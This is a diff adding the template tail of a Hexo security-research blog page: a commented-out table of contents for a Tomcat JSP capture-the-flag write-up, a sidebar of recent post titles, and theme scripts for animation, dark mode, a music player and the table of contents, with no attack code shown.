+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022RWCTF-desperate-cat-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%99JAR%E6%96%87%E4%BB%B6%E5%92%8C%E8%84%8F%E6%95%B0%E6%8D%AE%E7%BB%95%E8%BF%87"><span class="toc-text">2022RWCTF desperate cat 字符串写JAR文件和脏数据绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF"><span class="toc-text">场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9AEL-session%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">解法1：EL+session序列化写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WP"><span class="toc-text">WP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9AASCII-JAR%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">解法2：ASCII-JAR文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JAR%E5%8C%85%E7%BB%93%E6%9E%84"><span class="toc-text">JAR包结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JAR%E5%8C%85%E6%9E%84%E9%80%A0"><span class="toc-text">JAR包构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%90%8E%E8%84%8F%E6%95%B0%E6%8D%AE%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-text">前后脏数据的构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BDJAR"><span class="toc-text">加载JAR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8JSP"><span class="toc-text">调用JSP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="toc-text">知识点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E4%B8%ADJSP%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-text">Tomcat中JSP的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#trick1%EF%BC%9AUnicode-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">trick1：Unicode 编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trick2%EF%BC%9A%E6%96%87%E4%BB%B6%E7%BC%96%E7%A0%81"><span class="toc-text">trick2：文件编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trick3%EF%BC%9AJSP%E6%A0%87%E7%AD%BE"><span class="toc-text">trick3：JSP标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trick4%EF%BC%9A-JSPX-x2F-TAGX-%E7%9A%84-XML-Tricks"><span class="toc-text">trick4： JSPX &#x2F; TAGX 的 XML Tricks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trick5%EF%BC%9Atag%E7%BB%95%E8%BF%87jsp%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B"><span class="toc-text">trick5：tag绕过jsp内容检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#trick6%EF%BC%9A-JSP-%E6%8B%BC%E6%8E%A5%E9%97%AD%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-text">trick6： JSP 拼接闭合绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#other"><span class="toc-text">other</span></a></li></ol></li></ol> -->
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- 手机端目录按钮 -->
+<div id="toc-mobile-btn">
+  <i class="fas fa-list-ul" aria-hidden="true"></i>
+</div>
+
+      
+  <section class="widget side_recent_post">
+    
+  <header>
+    
+      <a style="color: " href='/tags/'><i class="fas fa-book fa-fw" aria-hidden="true"></i><span class='name'>最新文章</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      
+      <!-- hash算法 -->
+      
+      <div class="aside-list">
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/04/21/2022rwctf-desperate-cat-xue-xi-zi-fu-chuan-xie-jar-wen-jian-he-zang-shu-ju-rao-guo/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8149.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8149.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">04-21</span>
+                
+              </div>
+              <a class="post-title" href="/2025/04/21/2022rwctf-desperate-cat-xue-xi-zi-fu-chuan-xie-jar-wen-jian-he-zang-shu-ju-rao-guo/">Tomcat下SpEL的不出网利用</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/04/17/spel-de-bu-chu-wang-li-yong/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8148.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8148.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">04-17</span>
+                
+              </div>
+              <a class="post-title" href="/2025/04/17/spel-de-bu-chu-wang-li-yong/">Tomcat下SpEL的不出网利用</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/04/17/apache-hertzbeat-snakeyaml-fan-xu-lie-hua/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8147.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8147.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">04-17</span>
+                
+              </div>
+              <a class="post-title" href="/2025/04/17/apache-hertzbeat-snakeyaml-fan-xu-lie-hua/">Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/04/15/shiro-fan-xu-lie-hua-tu-po-chang-du-xian-zhi/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8146.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8146.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">04-15</span>
+                
+              </div>
+              <a class="post-title" href="/2025/04/15/shiro-fan-xu-lie-hua-tu-po-chang-du-xian-zhi/">Shiro反序列化突破长度限制</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/04/14/cc-zhu-ru-tomcat-upgrade-executor-he-websocket-nei-cun-ma/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8145.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8145.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">04-14</span>
+                
+              </div>
+              <a class="post-title" href="/2025/04/14/cc-zhu-ru-tomcat-upgrade-executor-he-websocket-nei-cun-ma/">CC注入Tomcat Upgrade/Executor/WebSocket内存马</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  
+    <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || 'rgba(66, 185, 133, 0.8)';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2020 - 2025 <a target="_blank" rel="noopener" href="https://github.com/godownio">godownio</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+            <!-- 不蒜子统计 -->
+            <!-- 不蒜子统计 -->
+<span id="busuanzi_container_site_pv">
+      <i class="fas fa-eye" aria-hidden="true"></i>本站总访问量：<span id="busuanzi_value_site_pv"></span> 次
+</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+      <i class="fas fa-users" aria-hidden="true"></i>本站访客数：<span id="busuanzi_value_site_uv"></span> 人
+</span>
+
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark">
+  <div class="dark-content">
+    <i class="fas fa-moon" aria-hidden="true"></i>
+    <!-- <span>关灯</span> -->
+  </div>
+  
+</div>
+
+<script>
+  $(function() {
+    let isDark = JSON.parse(localStorage.getItem('dark'))  || JSON.parse('false');
+    if (isDark) {
+      $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+    }
+    $('.dark').click(function() {
+      if ($(document.body).is('.darkModel')) {
+        $(document.body).removeClass('darkModel');
+        localStorage.setItem('dark', false);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-moon" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      } else {
+        $(document.body).addClass('darkModel');
+        localStorage.setItem('dark', true);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      }
+    })
+  })
+</script>
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="tencent"
+  type="album"
+  id="002VeS6r4L5fLZ"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: 20,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
